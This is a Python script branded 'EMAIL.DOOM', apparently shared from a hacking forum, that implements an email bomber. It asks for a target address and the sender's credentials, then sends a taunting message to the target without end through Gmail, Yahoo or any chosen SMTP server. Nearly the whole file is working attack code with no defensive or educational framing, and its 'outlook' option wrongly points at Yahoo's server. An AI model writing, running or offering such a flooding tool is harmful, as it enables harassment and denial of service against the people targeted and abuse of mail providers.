import smtplib, ssl # to send mails
import os # to get system root, to clear screen etc.
import time # to make pauses
# imports

red = "\u001b[31m"
green = "\u001b[32m"
cyan = "\u001b[36m"
yellow = "\u001b[33m"
blue = "\u001b[34m"
white = "\u001b[37m"
reset_color = "\u001b[0m"
# some ansi-colors

class Logo():
	os.system('clear')
	os.system('cls')
	logo = """\
		                __________
                      .~###########;~.
                     /##############;;.
                    /######/~\/~\##;,;,.
                   |#######\    /;;;;.,.|         \u001b[31m[[\u001b[33m Athur _SaWan0_, github : https://www.github.com/sswanoo, Hackforums : https://hackforums.net/member.php?action=profile&uid=4940482 \u001b[31m]]\u001b[32m 
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |########;;;;,.|     @#%,.@  X.....| X
X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
 X# \.X        @#%,.@                  @#%,.@        X./  #
  ##  X          @#%,.@              @#%,.@          X   #
, "# #X            @#%,.@          @#%,.@            X ##  
   `###X             @#%,.@      @#%,.@             ####'
  . ' ###              @#%.,@  @#%,.@              ###`"
    . ";"                @#%.@#%,.@                ;"` ' .
      '                    @#%,.@                   ,.
      ` ,                @#%,.@  @@                `
                          @@@  @@@

                      \u001b[31m[[ EMAIL.DOOM ]]
					  \u001b[33m
		"""
	print(green + logo)
	time.sleep(0.7)


receiver_email = input("Target Email >>")
sender_email = input("Enter your email >>")
password = input("Enter your password >>")	
# mail variables

print("\n")
print(white)
print("!Type '1' for gmail bombing.")
print("!Type '2' for yahoo bombing.")
print("!Type '3' for outlook bombing.")
print("!Type '4' for other client.")
print("!Type EXIT to close the program.")
print("\n")
command = input(blue + "Email" + red + "@Doom" + white + ":")
print("\n")
# info / user input

def gmail_bomb():
	while True:
		port = 587 
		smtp_server = "smtp.gmail.com"
		message = """\
		DOOM

		YOU JUST GOT DOOMED LMAO"""

		context = ssl.create_default_context()
		with smtplib.SMTP(smtp_server, port) as server:
		    server.ehlo()  
		    server.starttls(context=context)
		    server.ehlo()  
		    server.login(sender_email, password)
		    server.sendmail(sender_email, receiver_email, message)
		print(red + "message sent [+]")
		print(reset_color)

def yahoo_bomb():
	while True:
		port = 587 
		smtp_server = "smtp.mail.yahoo.com"
		message = """\
		DOOM

		YOU JUST GOT DOOMED LMAO"""

		context = ssl.create_default_context()
		with smtplib.SMTP(smtp_server, port) as server:
		    server.ehlo()  
		    server.starttls(context=context)
		    server.ehlo()  
		    server.login(sender_email, password)
		    server.sendmail(sender_email, receiver_email, message)
		print(red + "message sent [+]")
		print(reset_color)

def outlook_bomb():
	while True:
		port = 587 
		smtp_server = "smtp.mail.yahoo.com"
		message = """\
		DOOM

		YOU JUST GOT DOOMED LMAO"""

		context = ssl.create_default_context()
		with smtplib.SMTP(smtp_server, port) as server:
		    server.ehlo()  
		    server.starttls(context=context)
		    server.ehlo()  
		    server.login(sender_email, password)
		    server.sendmail(sender_email, receiver_email, message)
		print(red + "message sent [+]")
		print(reset_color)

def own_bomb():
	while True:
		port = input("port >>")
		smtp_server = input("smtp server >>")
		message = """\
		DOOM

		YOU JUST GOT DOOMED LMAO"""

		context = ssl.create_default_context()
		with smtplib.SMTP(smtp_server, port) as server:
		    server.ehlo()  
		    server.starttls(context=context)
		    server.ehlo()  
		    server.login(sender_email, password)
		    server.sendmail(sender_email, receiver_email, message)
		print(red + "message sent [+]")
		print(reset_color)				
# bomb-types	

if command == "1":
	gmail_bomb()

elif command == "2":
	yahoo_bomb()

elif command == "3":
	outlook_bomb()

elif command == "4":
	own_bomb()

elif command == "EXIT":
	print(red + "thanks for using my program ! BTW you also got DOOMED LMAO ;)")
	print(reset_color)

else:
	print(red + "Invalid option [-] exiting...")
	print(reset_color)

# commands







